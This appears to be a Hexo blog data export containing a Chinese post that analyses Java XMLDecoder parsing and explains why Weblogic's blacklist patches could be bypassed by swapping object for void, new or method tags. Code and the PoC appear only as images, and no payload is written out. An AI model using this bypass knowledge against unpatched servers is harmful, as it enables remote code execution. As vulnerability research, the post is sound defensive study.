alt=\"wJr9u4.jpg\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h1 id=\"阿里白帽大会留念\"><a href=\"#阿里白帽大会留念\" class=\"headerlink\" title=\"阿里白帽大会留念\"></a>阿里白帽大会留念</h1><p><img src=\"https://s1.ax1x.com/2020/09/10/wJDdtx.jpg\" alt=\"wJDdtx.jpg\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/09/10/wJrPb9.jpg\" alt=\"wJrPb9.jpg\"></p>\n<p><img src=\"https://s1.ax1x.com/2020/09/10/wJr9u4.jpg\" alt=\"wJr9u4.jpg\"></p>\n"},{"title":"XMLDecoder解析流程以及历史绕过分析","date":"2019-10-27T10:07:52.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/c731555993eb4ce02be0ed40e046e8d.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nWeblogic曾出现过多个与XMLDecoder相关的漏洞(CVE-2017-3506、CVE-2017-10352、CVE-2019-2725)。\n\nWeblogic针对于漏洞的修复，往往是增加黑名单以限制xml中的元素，例如针对CVE-2017-3506的修复方法，限制了object标签使得攻击者无法创建指定类的实例。但是攻击者可以使用void、new来代替object，从而造成了CVE-2017-10352漏洞的产生。\n\n那为什么在XMLDecoder解析时，可以使用void、new来代替object呢？本文将详细的分析XMLDecoder代码，以找到答案。\n\n<!--more-->\n\n基础概念\n--------\n\nXMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象,简单的案例可见官方给出的下图代码\n\n![laapB4.png](https://s2.ax1x.com/2020/01/03/laapB4.png)\n\n首先，我们写一个简单的测试demo TestStudent类\n\n![laaE36.png](https://s2.ax1x.com/2020/01/03/laaE36.png)\n\nTestStudent类中将完成从XMLEncoder到XMLDecoder的过程\n\nStudent类如下图\n\n![laaF41.png](https://s2.ax1x.com/2020/01/03/laaF41.png)\n\n首先看下XML编码以及写入文件过程，见下图红框处\n\n![laanDe.png](https://s2.ax1x.com/2020/01/03/laanDe.png)\n\n在程序将Student类的实例在XML编码后写入student.xml，student.xml文件如下图\n\n![laal4I.png](https://s2.ax1x.com/2020/01/03/laal4I.png)\n\n接下来，程序将读取student.xml文件内容，并进行xml反序列化\n\n![laU5jS.png](https://s2.ax1x.com/2020/01/03/laU5jS.png)\n\nXMLDecoder反序列化\n------------------\n\n为了研究xmldecoder是如何进行反序列化，以及文章开头我们提出的问题，我们跟一下代码\n\n在readObject方法上下断，如下图\n\n![laagrF.png](https://s2.ax1x.com/2020/01/03/laagrF.png)\n\n之后的调用栈特别的深，从我们TestStudent中的readObject到DocumentHandler类中的startElement方法。具体可以见下图\n\n![laUDXD.png](https://s2.ax1x.com/2020/01/03/laUDXD.png)\n\n之所以我们要在DocumentHandler中的startElement下断点，是因为DocumentHandler继承自DefaultHandler。DefaultHandler是使用SAX进行XML解析的默认Handler。因此DocumentHandler相当于xml解析的开始，而startElement是开始标签处理函数，包括属性的添加，因此我们从开始标签处理处着手跟入。\n\n但是在正式跟入前，我们首先看下DocumentHandler的构造方法\n\n![laatKS.png](https://s2.ax1x.com/2020/01/03/laatKS.png)\n\n上图构造方法中，定义了可以解析的xml元素以及它们对应的使用的解析器\n\n关于这点，我们正式跟入startElement中的断点，从下图startElement中看到\n\n![laURht.png](https://s2.ax1x.com/2020/01/03/laURht.png)\n\n在this.handlers列表中，这里包含了各个xml元素对应使用的解析器\n\n对照我们的xml文件\n\n![lryAAI.png](https://s2.ax1x.com/2020/01/06/lryAAI.png)\n\n第一个标签是java\n\nJava对应的解析器是JavaElementHandler\n\n![laUwp6.png](https://s2.ax1x.com/2020/01/03/laUwp6.png)\n\n![laa9HJ.png](https://s2.ax1x.com/2020/01/03/laa9HJ.png)\n\n我们先跳过java标签不看，直接看下一个解析的标签\n\n![laaMEd.png](https://s2.ax1x.com/2020/01/03/laaMEd.png)\n\n下一个标签就是重要的object标签\n\n根据对应关系，进入ObjectElementHandler解析器，见下图\n\n![laamuD.png](https://s2.ax1x.com/2020/01/03/laamuD.png)\n\n从上图可见ObjectElementHandler 继承了 NewElementHandler类\n\n而NewElementHandler类，正是new标签对应的解析类，见下图\n\n![laa3Ct.png](https://s2.ax1x.com/2020/01/03/laa3Ct.png)\n\n这里已经涉及到为什么可以用new代替object的部分原因了，但是不是确凿证据。记住这里的继承关系，我们接着看ObjectElementHandler类\n\n在ObjectElementHandler类中，存在一个addAttribute方法，见下图\n\n![laUh1f.png](https://s2.ax1x.com/2020/01/03/laUh1f.png)\n\naddAttribute的作用是在解析对应标签时，为标签对象添加相应的属性\n\n这里我们解析的时object标签，而我们的object标签中只有class属性，见下图\n\n![laa88P.png](https://s2.ax1x.com/2020/01/03/laa88P.png)\n\n当然，如果有idref、field、index、method等等，程序会将其值赋值给对应的属性\n\n例如下图，object有index属性\n\n![laUj3V.png](https://s2.ax1x.com/2020/01/03/laUj3V.png)\n\n那么这里的this.index就为”xxx”\n\n回到正文，由于上述属性我们的xml object里都没有，直接进入下图断点\n\n![laaA9x.png](https://s2.ax1x.com/2020/01/03/laaA9x.png)\n\n调用父类NewElementHandler的addAttribute方法\n\n![laaQUA.png](https://s2.ax1x.com/2020/01/03/laaQUA.png)\n\nNewElementHandler中addAttribute方法为对象添加class属性\n\n这样看来，需要继承NewElementHandler类的标签解析器，对应的标签默认都有class属性。因为这些标签默认都有class属性，因此直接继承NewElementHandler类中addAttribute方法对class属性进行赋值，这样就不用一一重写了。\n\n为了证明一下我的观点，我们跳出测试xml文件，直接看一下weblogic的漏洞利用的poc\n\n![lryENt.png](https://s2.ax1x.com/2020/01/06/lryENt.png)\n\n可见java标签、object标签、array标签，都有class属性\n\n![laaZjO.png](https://s2.ax1x.com/2020/01/03/laaZjO.png)\n\narray标签的解析器也继承了NewElementHandler\n\n![laUTBQ.png](https://s2.ax1x.com/2020/01/03/laUTBQ.png)\n\n由于java标签要处理version，于是自己实现了class标签处理而非继承NewElementHandler\n\n回到调试流程中，在NewElementHandler的addAttribute方法中进行class属性赋值\n\n![laUUt1.png](https://s2.ax1x.com/2020/01/03/laUUt1.png)\n\n![laU01K.png](https://s2.ax1x.com/2020/01/03/laU01K.png)\n\n经过class赋值后，object标签的tpye属性已经为我们的Student类对象\n\n接下来，程序将逐一为我们的xml里的标签进行addAttribute属性赋值操作，从java标签到object标签到void等等\n\n当DocumentHandler中的startElement这个过程结束后，程序将调用endElement方法，endElement方法为结束标签处理函数，见下图\n\n![laUxjU.png](https://s2.ax1x.com/2020/01/03/laUxjU.png)\n\nendElement方法中将调用getValueObject方法获取每一个标签所产生的对象对应的ValueObject实例\n\n我们直接跳转到对object标签的处理\n\n![laadEj.png](https://s2.ax1x.com/2020/01/03/laadEj.png)\n\n![laaVgK.png](https://s2.ax1x.com/2020/01/03/laaVgK.png)\n\n从上图可见，程序直接通过Expression生成实例。这里对应生成了我们的Student类的实例\n\nXMLDecoder反序列化的流程就是上文分析的这样，那为什么可以用new、代替object呢？\n\n### 为什么可以用new替换object\n\n还记不记得上文这里\n\n![laaUbQ.png](https://s2.ax1x.com/2020/01/03/laaUbQ.png)\n\n当解析object标签，用的是ObjectElementHandler解析器，而ObjectElementHandler继承了NewElementHandler。更重要的是，在将object中class属性进行赋值时，用的仍然是NewElementHandler中的addAttribute方法。New标签直接使用NewElementHandler进行解析。因此二者最终进行我们Student类实例的赋值操作是完全一样的\n\n### 为什么可以用void替换object\n\n经过上文的分析，这个问题更简单了，我们看下void标签的解析器\n\n![laUbAs.png](https://s2.ax1x.com/2020/01/03/laUbAs.png)\n\nvoid标签的解析器是VoidElementHandler，这个解析器直接继承了ObjectElementHandler，并且仅仅重写了isArgument方法,而这个方法在我们反序列化利用的过程中并无影响\n\n### 为什么可以用method替换object\n\n这个问题也比较简单，我们看下method标签的解析器\n\n![laaiNR.png](https://s2.ax1x.com/2020/01/03/laaiNR.png)\n\n可见与object一样，也是继承了NewElementHandler类。与此同时，于object类中的addAttribute方法中类似，也是使用NewElementHandler类中的addAttribute方法处理class属性。Method与Object标签解析器实现的方式几乎一摸一样，因此可以用method代替object","source":"_posts/xmldecoder.md","raw":"---\ntitle: XMLDecoder解析流程以及历史绕过分析\ndate: 2019-10-27 18:07:52\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/c731555993eb4ce02be0ed40e046e8d.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nWeblogic曾出现过多个与XMLDecoder相关的漏洞(CVE-2017-3506、CVE-2017-10352、CVE-2019-2725)。\n\nWeblogic针对于漏洞的修复，往往是增加黑名单以限制xml中的元素，例如针对CVE-2017-3506的修复方法，限制了object标签使得攻击者无法创建指定类的实例。但是攻击者可以使用void、new来代替object，从而造成了CVE-2017-10352漏洞的产生。\n\n那为什么在XMLDecoder解析时，可以使用void、new来代替object呢？本文将详细的分析XMLDecoder代码，以找到答案。\n\n<!--more-->\n\n基础概念\n--------\n\nXMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象,简单的案例可见官方给出的下图代码\n\n![laapB4.png](https://s2.ax1x.com/2020/01/03/laapB4.png)\n\n首先，我们写一个简单的测试demo TestStudent类\n\n![laaE36.png](https://s2.ax1x.com/2020/01/03/laaE36.png)\n\nTestStudent类中将完成从XMLEncoder到XMLDecoder的过程\n\nStudent类如下图\n\n![laaF41.png](https://s2.ax1x.com/2020/01/03/laaF41.png)\n\n首先看下XML编码以及写入文件过程，见下图红框处\n\n![laanDe.png](https://s2.ax1x.com/2020/01/03/laanDe.png)\n\n在程序将Student类的实例在XML编码后写入student.xml，student.xml文件如下图\n\n![laal4I.png](https://s2.ax1x.com/2020/01/03/laal4I.png)\n\n接下来，程序将读取student.xml文件内容，并进行xml反序列化\n\n![laU5jS.png](https://s2.ax1x.com/2020/01/03/laU5jS.png)\n\nXMLDecoder反序列化\n------------------\n\n为了研究xmldecoder是如何进行反序列化，以及文章开头我们提出的问题，我们跟一下代码\n\n在readObject方法上下断，如下图\n\n![laagrF.png](https://s2.ax1x.com/2020/01/03/laagrF.png)\n\n之后的调用栈特别的深，从我们TestStudent中的readObject到DocumentHandler类中的startElement方法。具体可以见下图\n\n![laUDXD.png](https://s2.ax1x.com/2020/01/03/laUDXD.png)\n\n之所以我们要在DocumentHandler中的startElement下断点，是因为DocumentHandler继承自DefaultHandler。DefaultHandler是使用SAX进行XML解析的默认Handler。因此DocumentHandler相当于xml解析的开始，而startElement是开始标签处理函数，包括属性的添加，因此我们从开始标签处理处着手跟入。\n\n但是在正式跟入前，我们首先看下DocumentHandler的构造方法\n\n![laatKS.png](https://s2.ax1x.com/2020/01/03/laatKS.png)\n\n上图构造方法中，定义了可以解析的xml元素以及它们对应的使用的解析器\n\n关于这点，我们正式跟入startElement中的断点，从下图startElement中看到\n\n![laURht.png](https://s2.ax1x.com/2020/01/03/laURht.png)\n\n在this.handlers列表中，这里包含了各个xml元素对应使用的解析器\n\n对照我们的xml文件\n\n![lryAAI.png](https://s2.ax1x.com/2020/01/06/lryAAI.png)\n\n第一个标签是java\n\nJava对应的解析器是JavaElementHandler\n\n![laUwp6.png](https://s2.ax1x.com/2020/01/03/laUwp6.png)\n\n![laa9HJ.png](https://s2.ax1x.com/2020/01/03/laa9HJ.png)\n\n我们先跳过java标签不看，直接看下一个解析的标签\n\n![laaMEd.png](https://s2.ax1x.com/2020/01/03/laaMEd.png)\n\n下一个标签就是重要的object标签\n\n根据对应关系，进入ObjectElementHandler解析器，见下图\n\n![laamuD.png](https://s2.ax1x.com/2020/01/03/laamuD.png)\n\n从上图可见ObjectElementHandler 继承了 NewElementHandler类\n\n而NewElementHandler类，正是new标签对应的解析类，见下图\n\n![laa3Ct.png](https://s2.ax1x.com/2020/01/03/laa3Ct.png)\n\n这里已经涉及到为什么可以用new代替object的部分原因了，但是不是确凿证据。记住这里的继承关系，我们接着看ObjectElementHandler类\n\n在ObjectElementHandler类中，存在一个addAttribute方法，见下图\n\n![laUh1f.png](https://s2.ax1x.com/2020/01/03/laUh1f.png)\n\naddAttribute的作用是在解析对应标签时，为标签对象添加相应的属性\n\n这里我们解析的时object标签，而我们的object标签中只有class属性，见下图\n\n![laa88P.png](https://s2.ax1x.com/2020/01/03/laa88P.png)\n\n当然，如果有idref、field、index、method等等，程序会将其值赋值给对应的属性\n\n例如下图，object有index属性\n\n![laUj3V.png](https://s2.ax1x.com/2020/01/03/laUj3V.png)\n\n那么这里的this.index就为”xxx”\n\n回到正文，由于上述属性我们的xml object里都没有，直接进入下图断点\n\n![laaA9x.png](https://s2.ax1x.com/2020/01/03/laaA9x.png)\n\n调用父类NewElementHandler的addAttribute方法\n\n![laaQUA.png](https://s2.ax1x.com/2020/01/03/laaQUA.png)\n\nNewElementHandler中addAttribute方法为对象添加class属性\n\n这样看来，需要继承NewElementHandler类的标签解析器，对应的标签默认都有class属性。因为这些标签默认都有class属性，因此直接继承NewElementHandler类中addAttribute方法对class属性进行赋值，这样就不用一一重写了。\n\n为了证明一下我的观点，我们跳出测试xml文件，直接看一下weblogic的漏洞利用的poc\n\n![lryENt.png](https://s2.ax1x.com/2020/01/06/lryENt.png)\n\n可见java标签、object标签、array标签，都有class属性\n\n![laaZjO.png](https://s2.ax1x.com/2020/01/03/laaZjO.png)\n\narray标签的解析器也继承了NewElementHandler\n\n![laUTBQ.png](https://s2.ax1x.com/2020/01/03/laUTBQ.png)\n\n由于java标签要处理version，于是自己实现了class标签处理而非继承NewElementHandler\n\n回到调试流程中，在NewElementHandler的addAttribute方法中进行class属性赋值\n\n![laUUt1.png](https://s2.ax1x.com/2020/01/03/laUUt1.png)\n\n![laU01K.png](https://s2.ax1x.com/2020/01/03/laU01K.png)\n\n经过class赋值后，object标签的tpye属性已经为我们的Student类对象\n\n接下来，程序将逐一为我们的xml里的标签进行addAttribute属性赋值操作，从java标签到object标签到void等等\n\n当DocumentHandler中的startElement这个过程结束后，程序将调用endElement方法，endElement方法为结束标签处理函数，见下图\n\n![laUxjU.png](https://s2.ax1x.com/2020/01/03/laUxjU.png)\n\nendElement方法中将调用getValueObject方法获取每一个标签所产生的对象对应的ValueObject实例\n\n我们直接跳转到对object标签的处理\n\n![laadEj.png](https://s2.ax1x.com/2020/01/03/laadEj.png)\n\n![laaVgK.png](https://s2.ax1x.com/2020/01/03/laaVgK.png)\n\n从上图可见，程序直接通过Expression生成实例。这里对应生成了我们的Student类的实例\n\nXMLDecoder反序列化的流程就是上文分析的这样，那为什么可以用new、代替object呢？\n\n### 为什么可以用new替换object\n\n还记不记得上文这里\n\n![laaUbQ.png](https://s2.ax1x.com/2020/01/03/laaUbQ.png)\n\n当解析object标签，用的是ObjectElementHandler解析器，而ObjectElementHandler继承了NewElementHandler。更重要的是，在将object中class属性进行赋值时，用的仍然是NewElementHandler中的addAttribute方法。New标签直接使用NewElementHandler进行解析。因此二者最终进行我们Student类实例的赋值操作是完全一样的\n\n### 为什么可以用void替换object\n\n经过上文的分析，这个问题更简单了，我们看下void标签的解析器\n\n![laUbAs.png](https://s2.ax1x.com/2020/01/03/laUbAs.png)\n\nvoid标签的解析器是VoidElementHandler，这个解析器直接继承了ObjectElementHandler，并且仅仅重写了isArgument方法,而这个方法在我们反序列化利用的过程中并无影响\n\n### 为什么可以用method替换object\n\n这个问题也比较简单，我们看下method标签的解析器\n\n![laaiNR.png](https://s2.ax1x.com/2020/01/03/laaiNR.png)\n\n可见与object一样，也是继承了NewElementHandler类。与此同时，于object类中的addAttribute方法中类似，也是使用NewElementHandler类中的addAttribute方法处理class属性。Method与Object标签解析器实现的方式几乎一摸一样，因此可以用method代替object","slug":"xmldecoder","published":1,"updated":"2020-10-27T09:25:30.030Z","_id":"ckgrozuai0069wsa96mdwdqgn","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Weblogic曾出现过多个与XMLDecoder相关的漏洞(CVE-2017-3506、CVE-2017-10352、CVE-2019-2725)。</p>\n<p>Weblogic针对于漏洞的修复，往往是增加黑名单以限制xml中的元素，例如针对CVE-2017-3506的修复方法，限制了object标签使得攻击者无法创建指定类的实例。但是攻击者可以使用void、new来代替object，从而造成了CVE-2017-10352漏洞的产生。</p>\n<p>那为什么在XMLDecoder解析时，可以使用void、new来代替object呢？本文将详细的分析XMLDecoder代码，以找到答案。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h2><p>XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象,简单的案例可见官方给出的下图代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laapB4.png\" alt=\"laapB4.png\"></p>\n<p>首先，我们写一个简单的测试demo TestStudent类</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaE36.png\" alt=\"laaE36.png\"></p>\n<p>TestStudent类中将完成从XMLEncoder到XMLDecoder的过程</p>\n<p>Student类如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaF41.png\" alt=\"laaF41.png\"></p>\n<p>首先看下XML编码以及写入文件过程，见下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laanDe.png\" alt=\"laanDe.png\"></p>\n<p>在程序将Student类的实例在XML编码后写入student.xml，student.xml文件如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laal4I.png\" alt=\"laal4I.png\"></p>\n<p>接下来，程序将读取student.xml文件内容，并进行xml反序列化</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laU5jS.png\" alt=\"laU5jS.png\"></p>\n<h2 id=\"XMLDecoder反序列化\"><a href=\"#XMLDecoder反序列化\" class=\"headerlink\" title=\"XMLDecoder反序列化\"></a>XMLDecoder反序列化</h2><p>为了研究xmldecoder是如何进行反序列化，以及文章开头我们提出的问题，我们跟一下代码</p>\n<p>在readObject方法上下断，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laagrF.png\" alt=\"laagrF.png\"></p>\n<p>之后的调用栈特别的深，从我们TestStudent中的readObject到DocumentHandler类中的startElement方法。具体可以见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUDXD.png\" alt=\"laUDXD.png\"></p>\n<p>之所以我们要在DocumentHandler中的startElement下断点，是因为DocumentHandler继承自DefaultHandler。DefaultHandler是使用SAX进行XML解析的默认Handler。因此DocumentHandler相当于xml解析的开始，而startElement是开始标签处理函数，包括属性的添加，因此我们从开始标签处理处着手跟入。</p>\n<p>但是在正式跟入前，我们首先看下DocumentHandler的构造方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laatKS.png\" alt=\"laatKS.png\"></p>\n<p>上图构造方法中，定义了可以解析的xml元素以及它们对应的使用的解析器</p>\n<p>关于这点，我们正式跟入startElement中的断点，从下图startElement中看到</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laURht.png\" alt=\"laURht.png\"></p>\n<p>在this.handlers列表中，这里包含了各个xml元素对应使用的解析器</p>\n<p>对照我们的xml文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/06/lryAAI.png\" alt=\"lryAAI.png\"></p>\n<p>第一个标签是java</p>\n<p>Java对应的解析器是JavaElementHandler</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUwp6.png\" alt=\"laUwp6.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laa9HJ.png\" alt=\"laa9HJ.png\"></p>\n<p>我们先跳过java标签不看，直接看下一个解析的标签</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaMEd.png\" alt=\"laaMEd.png\"></p>\n<p>下一个标签就是重要的object标签</p>\n<p>根据对应关系，进入ObjectElementHandler解析器，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laamuD.png\" alt=\"laamuD.png\"></p>\n<p>从上图可见ObjectElementHandler 继承了 NewElementHandler类</p>\n<p>而NewElementHandler类，正是new标签对应的解析类，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laa3Ct.png\" alt=\"laa3Ct.png\"></p>\n<p>这里已经涉及到为什么可以用new代替object的部分原因了，但是不是确凿证据。记住这里的继承关系，我们接着看ObjectElementHandler类</p>\n<p>在ObjectElementHandler类中，存在一个addAttribute方法，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUh1f.png\" alt=\"laUh1f.png\"></p>\n<p>addAttribute的作用是在解析对应标签时，为标签对象添加相应的属性</p>\n<p>这里我们解析的时object标签，而我们的object标签中只有class属性，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laa88P.png\" alt=\"laa88P.png\"></p>\n<p>当然，如果有idref、field、index、method等等，程序会将其值赋值给对应的属性</p>\n<p>例如下图，object有index属性</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUj3V.png\" alt=\"laUj3V.png\"></p>\n<p>那么这里的this.index就为”xxx”</p>\n<p>回到正文，由于上述属性我们的xml object里都没有，直接进入下图断点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaA9x.png\" alt=\"laaA9x.png\"></p>\n<p>调用父类NewElementHandler的addAttribute方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaQUA.png\" alt=\"laaQUA.png\"></p>\n<p>NewElementHandler中addAttribute方法为对象添加class属性</p>\n<p>这样看来，需要继承NewElementHandler类的标签解析器，对应的标签默认都有class属性。因为这些标签默认都有class属性，因此直接继承NewElementHandler类中addAttribute方法对class属性进行赋值，这样就不用一一重写了。</p>\n<p>为了证明一下我的观点，我们跳出测试xml文件，直接看一下weblogic的漏洞利用的poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/06/lryENt.png\" alt=\"lryENt.png\"></p>\n<p>可见java标签、object标签、array标签，都有class属性</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaZjO.png\" alt=\"laaZjO.png\"></p>\n<p>array标签的解析器也继承了NewElementHandler</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUTBQ.png\" alt=\"laUTBQ.png\"></p>\n<p>由于java标签要处理version，于是自己实现了class标签处理而非继承NewElementHandler</p>\n<p>回到调试流程中，在NewElementHandler的addAttribute方法中进行class属性赋值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUUt1.png\" alt=\"laUUt1.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laU01K.png\" alt=\"laU01K.png\"></p>\n<p>经过class赋值后，object标签的tpye属性已经为我们的Student类对象</p>\n<p>接下来，程序将逐一为我们的xml里的标签进行addAttribute属性赋值操作，从java标签到object标签到void等等</p>\n<p>当DocumentHandler中的startElement这个过程结束后，程序将调用endElement方法，endElement方法为结束标签处理函数，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUxjU.png\" alt=\"laUxjU.png\"></p>\n<p>endElement方法中将调用getValueObject方法获取每一个标签所产生的对象对应的ValueObject实例</p>\n<p>我们直接跳转到对object标签的处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laadEj.png\" alt=\"laadEj.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaVgK.png\" alt=\"laaVgK.png\"></p>\n<p>从上图可见，程序直接通过Expression生成实例。这里对应生成了我们的Student类的实例</p>\n<p>XMLDecoder反序列化的流程就是上文分析的这样，那为什么可以用new、代替object呢？</p>\n<h3 id=\"为什么可以用new替换object\"><a href=\"#为什么可以用new替换object\" class=\"headerlink\" title=\"为什么可以用new替换object\"></a>为什么可以用new替换object</h3><p>还记不记得上文这里</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaUbQ.png\" alt=\"laaUbQ.png\"></p>\n<p>当解析object标签，用的是ObjectElementHandler解析器，而ObjectElementHandler继承了NewElementHandler。更重要的是，在将object中class属性进行赋值时，用的仍然是NewElementHandler中的addAttribute方法。New标签直接使用NewElementHandler进行解析。因此二者最终进行我们Student类实例的赋值操作是完全一样的</p>\n<h3 id=\"为什么可以用void替换object\"><a href=\"#为什么可以用void替换object\" class=\"headerlink\" title=\"为什么可以用void替换object\"></a>为什么可以用void替换object</h3><p>经过上文的分析，这个问题更简单了，我们看下void标签的解析器</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laUbAs.png\" alt=\"laUbAs.png\"></p>\n<p>void标签的解析器是VoidElementHandler，这个解析器直接继承了ObjectElementHandler，并且仅仅重写了isArgument方法,而这个方法在我们反序列化利用的过程中并无影响</p>\n<h3 id=\"为什么可以用method替换object\"><a href=\"#为什么可以用method替换object\" class=\"headerlink\" title=\"为什么可以用method替换object\"></a>为什么可以用method替换object</h3><p>这个问题也比较简单，我们看下method标签的解析器</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/03/laaiNR.png\" alt=\"laaiNR.png\"></p>\n<p>可见与object一样，也是继承了NewElementHandler类。与此同时，于object类中的addAttribute方法中类似，也是使用NewElementHandler类中的addAttribute方法处理class属性。Method与Object标签解析器实现的方式几乎一摸一样，因此可以用method代替object</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Weblogic曾出现过多个与XMLDecoder相关的漏洞(CVE-2017-3506、CVE-2017-10352、CVE-2019-2725)。</p>\n<p>Weblogic针对于漏洞的修复，往往是增加黑名单以限制xml中的元素，例如针对CVE-2017-3506的修复方法，限制了object标签使得攻击者无法创建指定类的实例。但是攻击者可以使用void、new来代替object，从而造成了CVE-2017-10352漏洞的产生。</p>\n<p>那为什么在XMLDecoder解析时，可以使用void、new来代替object呢？本文将详细的分析XMLDecoder代码，以找到答案。</p>","more":"<h2 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h2><p>XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象,简单的案例可见官方给出的下图代码</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laapB4.png\" alt=\"laapB4.png\"></p>\n<p>首先，我们写一个简单的测试demo TestStudent类</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaE36.png\" alt=\"laaE36.png\"></p>\n<p>TestStudent类中将完成从XMLEncoder到XMLDecoder的过程</p>\n<p>Student类如下图</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/03/laaF41.png\" 